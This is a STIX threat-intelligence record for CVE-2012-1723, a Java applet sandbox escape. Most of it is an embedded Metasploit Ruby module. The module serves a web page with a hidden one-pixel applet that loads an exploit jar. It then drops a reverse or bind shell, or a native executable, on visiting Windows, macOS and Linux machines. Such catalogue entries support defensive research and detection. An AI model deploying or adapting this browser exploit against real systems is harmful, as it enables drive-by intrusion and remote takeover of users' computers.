{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef0da568-a7b3-4bd9-9085-f347ce0853da",
    "created": "2024-08-14T17:06:17.406323Z",
    "modified": "2024-08-14T17:06:17.406327Z",
    "name": "Java Applet Field Bytecode Verifier Cache Remote Code Execution",
    "description": " This module exploits a vulnerability in HotSpot bytecode verifier where an invalid optimization of GETFIELD/PUTFIELD/GETSTATIC/PUTSTATIC instructions leads to insufficient type checks. This allows a way to escape the JRE sandbox, and load additional classes in order to perform malicious operations.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_verifier_field_access.rb",
            "external_id": "java_verifier_field_access.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1723"
        },
        {
            "source_name": "reference",
            "url": "http://schierlm.users.sourceforge.net/CVE-2012-1723.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/javacpujun2012-1515912.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=829373"
        },
        {
            "source_name": "reference",
            "url": "http://icedtea.classpath.org/hg/release/icedtea7-forest-2.1/hotspot/rev/253e7c32def9"
        },
        {
            "source_name": "reference",
            "url": "http://icedtea.classpath.org/hg/release/icedtea7-forest-2.1/hotspot/rev/8f86ad60699b"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n    super( update_info( info,\n      'Name'           => 'Java Applet Field Bytecode Verifier Cache Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in HotSpot bytecode verifier where an invalid\n        optimization of GETFIELD/PUTFIELD/GETSTATIC/PUTSTATIC instructions leads to insufficient\n        type checks. This allows a way to escape the JRE sandbox, and load additional classes\n        in order to perform malicious operations.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Stefan Cornelius',      # Discoverer\n          'mihi',                  # Vuln analysis\n          'littlelightlittlefire', # metasploit module\n          'juan vazquez',          # merged code (overlapped)\n          'sinn3r'                 # merged code (overlapped)\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-1723'],\n          ['OSVDB', '82877'],\n          ['BID', '52161'],\n          ['URL', 'http://schierlm.users.sourceforge.net/CVE-2012-1723.html'],\n          ['URL', 'http://www.oracle.com/technetwork/topics/security/javacpujun2012-1515912.html'],\n          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=829373'],\n          ['URL', 'http://icedtea.classpath.org/hg/release/icedtea7-forest-2.1/hotspot/rev/253e7c32def9'],\n          ['URL', 'http://icedtea.classpath.org/hg/release/icedtea7-forest-2.1/hotspot/rev/8f86ad60699b']\n        ],\n      'Platform'       => %w{ java linux osx solaris win },\n      'Payload'        => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'        =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Platform' => ['java'],\n              'Arch' => ARCH_JAVA\n            }\n          ],\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Mac OS X PPC (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_PPC\n            }\n          ],\n          [ 'Mac OS X x86 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Linux x86 (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-06-06'\n    ))\n  end\n\n\n  def exploit\n    # load the static jar file\n    path = File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2012-1723.jar\" )\n    fd = File.open( path, \"rb\" )\n    @jar_data = fd.read(fd.stat.size)\n    fd.close\n\n    super\n  end\n\n\n  def on_request_uri( cli, request )\n    data = \"\"\n    host = \"\"\n    port = \"\"\n\n    if not request.uri.match(/\\.jar$/i)\n      if not request.uri.match(/\\/$/)\n        send_redirect( cli, get_resource() + '/', '')\n        return\n      end\n\n      print_status(\"Sending #{self.name}\")\n\n      payload = regenerate_payload( cli )\n      if not payload\n        print_error(\"Failed to generate the payload.\" )\n        return\n      end\n\n      if target.name == 'Generic (Java Payload)'\n        if datastore['LHOST']\n          jar  = payload.encoded\n          host = datastore['LHOST']\n          port = datastore['LPORT']\n          vprint_status(\"Sending java reverse shell\")\n        else\n          port = datastore['LPORT']\n          host = cli.peerhost\n          vprint_status( \"Java bind shell\" )\n        end\n        if jar\n          print_status( \"Generated jar to drop (#{jar.length} bytes).\" )\n          jar = Rex::Text.to_hex( jar, prefix=\"\" )\n        else\n          print_error(\"Failed to generate the executable.\" )\n          return\n        end\n      else\n\n        # NOTE: The EXE mixin automagically handles detection of arch/platform\n        data = generate_payload_exe\n\n        print_status(\"Generated executable to drop (#{data.length} bytes).\" )\n        data = Rex::Text.to_hex( data, prefix=\"\" )\n\n      end\n\n      send_response_html( cli, generate_html( data, jar, host, port ), { 'Content-Type' => 'text/html' } )\n      return\n    end\n\n    print_status(\"Sending jar\")\n    send_response( cli, generate_jar(), { 'Content-Type' => \"application/octet-stream\" } )\n\n    handler( cli )\n  end\n\n  def generate_html( data, jar, host, port )\n    jar_name = rand_text_alpha(rand(6)+3) + \".jar\"\n\n    html  = \"<html><head></head>\"\n    html += \"<body>\"\n    html += \"<applet archive=\\\"#{jar_name}\\\" code=\\\"cve1723.Attacker\\\" width=\\\"1\\\" height=\\\"1\\\">\"\n    html += \"<param name=\\\"data\\\" value=\\\"#{data}\\\"/>\" if data\n    html += \"<param name=\\\"jar\\\" value=\\\"#{jar}\\\"/>\" if jar\n    html += \"<param name=\\\"lhost\\\" value=\\\"#{host}\\\"/>\" if host\n    html += \"</applet></body></html>\"\n    return html\n  end\n\n  def generate_jar()\n    @jar_data\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-06-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}